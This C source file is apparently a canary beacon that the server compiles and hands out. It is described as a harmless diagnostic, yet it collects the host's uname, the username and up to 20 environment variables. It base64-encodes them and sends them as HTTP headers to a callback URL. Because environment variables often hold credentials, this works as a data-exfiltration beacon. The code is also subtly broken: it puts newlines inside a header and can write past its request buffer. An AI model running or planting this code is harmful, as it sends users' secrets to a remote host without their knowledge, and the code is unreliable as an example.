/*
 * diagnostic.c -- harmless fingerprinting binary.
 *
 * Compiled at serve-time by /api/internal/diagnostic/{token} with the
 * callback URL baked in via -DCANARY_URL="...".  Collects basic system
 * info (uname, username, env snapshot) and sends it as HTTP headers to
 * the callback endpoint using raw POSIX sockets -- no curl/libcurl
 * dependency.
 *
 * Build: musl-gcc -static -o diagnostic diagnostic.c
 */
#ifndef CANARY_URL
#define CANARY_URL "http://localhost:8000/api/internal/callback/placeholder"
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pwd.h>
#include <sys/utsname.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>

#define BUF_SZ 16384
#define HDR_MAX 8192

/* Base64 ----------------------------------------------------------------- */

static const char B64[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static void b64_enc(const unsigned char *src, size_t len, char *dst) {
    size_t i, j = 0;
    for (i = 0; i + 2 < len; i += 3) {
        dst[j++] = B64[(src[i] >> 2) & 0x3F];
        dst[j++] = B64[((src[i] & 0x03) << 4) | ((src[i + 1] >> 4) & 0x0F)];
        dst[j++] = B64[((src[i + 1] & 0x0F) << 2) | ((src[i + 2] >> 6) & 0x03)];
        dst[j++] = B64[src[i + 2] & 0x3F];
    }
    if (i < len) {
        dst[j++] = B64[(src[i] >> 2) & 0x3F];
        if (i + 1 < len) {
            dst[j++] = B64[((src[i] & 0x03) << 4) | ((src[i + 1] >> 4) & 0x0F)];
            dst[j++] = B64[(src[i + 1] & 0x0F) << 2];
        } else {
            dst[j++] = B64[(src[i] & 0x03) << 4];
            dst[j++] = '=';
        }
        dst[j++] = '=';
    }
    dst[j] = '\0';
}

/* Wrap base64 output at 76-char lines (MIME line length). */

static void b64_mime(const char *b64, char *out, size_t out_sz) {
    size_t slen = strlen(b64);
    size_t o = 0, i;
    for (i = 0; i < slen && o + 2 < out_sz; i++) {
        if (i > 0 && i % 76 == 0 && o + 1 < out_sz)
            out[o++] = '\n';
        out[o++] = b64[i];
    }
    out[o] = '\0';
}

/* Collect system info ----------------------------------------------------- */

static void collect_os(char *buf, size_t sz) {
    struct utsname u;
    if (uname(&u) == 0)
        snprintf(buf, sz, "%s %s %s %s %s", u.sysname, u.nodename,
                 u.release, u.version, u.machine);
    else
        snprintf(buf, sz, "unknown");
}

static void collect_user(char *buf, size_t sz) {
    uid_t uid = getuid();
    struct passwd *pw = getpwuid(uid);
    if (pw && pw->pw_name)
        snprintf(buf, sz, "%s", pw->pw_name);
    else
        snprintf(buf, sz, "uid%d", uid);
}

static void collect_env(char *b64_out, size_t b64_sz) {
    extern char **environ;
    char raw[BUF_SZ];
    size_t pos = 0;
    int count = 0;
    char **ep;
    for (ep = environ; *ep && count < 20; ep++, count++) {
        size_t elen = strlen(*ep);
        if (pos + elen + 1 >= sizeof(raw))
            break;
        memcpy(raw + pos, *ep, elen);
        pos += elen;
        raw[pos++] = '\n';
    }
    if (pos == 0) {
        raw[pos++] = '\n';
    }
    char tmp[BUF_SZ * 2];
    b64_enc((const unsigned char *)raw, pos, tmp);
    b64_mime(tmp, b64_out, b64_sz);
}

/* URL parsing ------------------------------------------------------------- */

typedef struct {
    char host[256];
    int  port;
    char path[1024];
} parsed_url_t;

static int parse_url(const char *url, parsed_url_t *u) {
    const char *p = url;
    if (strncmp(p, "http://", 7) == 0)
        p += 7;
    else
        return -1;

    const char *slash = strchr(p, '/');
    const char *colon = strchr(p, ':');
    size_t hlen;

    if (colon && (!slash || colon < slash)) {
        hlen = (size_t)(colon - p);
        if (hlen >= sizeof(u->host)) return -1;
        memcpy(u->host, p, hlen);
        u->host[hlen] = '\0';
        u->port = atoi(colon + 1);
    } else {
        hlen = slash ? (size_t)(slash - p) : strlen(p);
        if (hlen >= sizeof(u->host)) return -1;
        memcpy(u->host, p, hlen);
        u->host[hlen] = '\0';
        u->port = 80;
    }

    if (slash) {
        snprintf(u->path, sizeof(u->path), "%s", slash);
    } else {
        strcpy(u->path, "/");
    }
    return 0;
}

/* Socket helpers ---------------------------------------------------------- */

static int tcp_connect(const char *host, int port) {
    struct addrinfo hints, *res, *rp;
    char port_str[16];
    int fd;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    snprintf(port_str, sizeof(port_str), "%d", port);

    if (getaddrinfo(host, port_str, &hints, &res) != 0)
        return -1;

    for (rp = res; rp; rp = rp->ai_next) {
        fd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (fd < 0) continue;

        struct timeval tv = {.tv_sec = 5, .tv_usec = 0};
        setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

        if (connect(fd, rp->ai_addr, rp->ai_addrlen) == 0) {
            freeaddrinfo(res);
            return fd;
        }
        close(fd);
    }
    freeaddrinfo(res);
    return -1;
}

static void send_request(int fd, const char *path, const char *host,
                         const char *os_hdr, const char *user_hdr,
                         const char *env_hdr) {
    char req[HDR_MAX];
    int n = snprintf(req, sizeof(req),
        "GET %s HTTP/1.0\r\n"
        "Host: %s\r\n"
        "User-Agent: DiagnosticClient/1.0\r\n"
        "X-Diag-OS: %s\r\n"
        "X-Diag-User: %s\r\n"
        "X-Diag-Env: %s\r\n"
        "\r\n",
        path, host, os_hdr, user_hdr, env_hdr);
    write(fd, req, n);
}

static void read_response(int fd) {
    char buf[1024];
    while (read(fd, buf, sizeof(buf)) > 0)
        ;
}

/* Entry point ------------------------------------------------------------- */

int main(void) {
    char os_info[512], user_info[256], env_b64[BUF_SZ * 2];

    collect_os(os_info, sizeof(os_info));
    collect_user(user_info, sizeof(user_info));
    collect_env(env_b64, sizeof(env_b64));

    parsed_url_t url;
    if (parse_url(CANARY_URL, &url) != 0) {
        fprintf(stderr, "bad url\n");
        return 1;
    }

    int fd = tcp_connect(url.host, url.port);
    if (fd < 0) {
        fprintf(stderr, "connect failed\n");
        return 1;
    }

    send_request(fd, url.path, url.host, os_info, user_info, env_b64);
    read_response(fd);
    close(fd);
    return 0;
}
